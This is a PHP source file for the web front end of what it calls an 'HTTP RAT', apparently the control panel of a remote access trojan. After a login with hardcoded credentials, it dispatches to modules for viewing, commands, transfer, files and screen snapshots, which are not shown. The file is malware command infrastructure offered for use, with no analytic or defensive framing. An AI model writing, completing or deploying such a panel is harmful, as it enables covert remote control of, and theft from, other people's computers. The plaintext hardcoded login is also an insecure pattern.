<?php
session_start();
error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外的所有错误信息

echo "<!doctype html><html>";
echo "<head>";
echo '<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />';
echo "<title>HTTP RAT Web Client</title>";
echo "</head>";
echo "<body>";
echo '<header align="center"><strong>HTTP RAT Web Client v1.00</strong></header>';

$adminname=$_POST["adminname"];
$pass = $_POST["pass"];
if(($adminname=="whitepig")&&($pass=="httprat!))")) 
{
	$_SESSION["admin"]="whitepig";
}

if($_GET["do"]=="logout")
{
	unset($_SESSION["admin"]);
	header("location:httprat.php");
}

if(isset($_SESSION["admin"]))
{
	require("menu.php");
          
	switch ($_GET["do"])
	{
		case "view": require_once("view.php");break;
                case "cmd": require_once("cmd.php");break;
                case "tran":require_once("tran.php");break;
           
		case "file": require_once("file.php");break;
		case "snap": require_once("snap.php");break;
	}
}
else
{
	echo '<form action = "httprat.php" method="post">';
	echo '<p align=center>username:<input type="text" name="adminname" /><br/>passwd:<input type="password" name="pass" />';
	echo '<input type="submit" value="login"></p>';
}



echo '</body>';
echo '</html>';



?>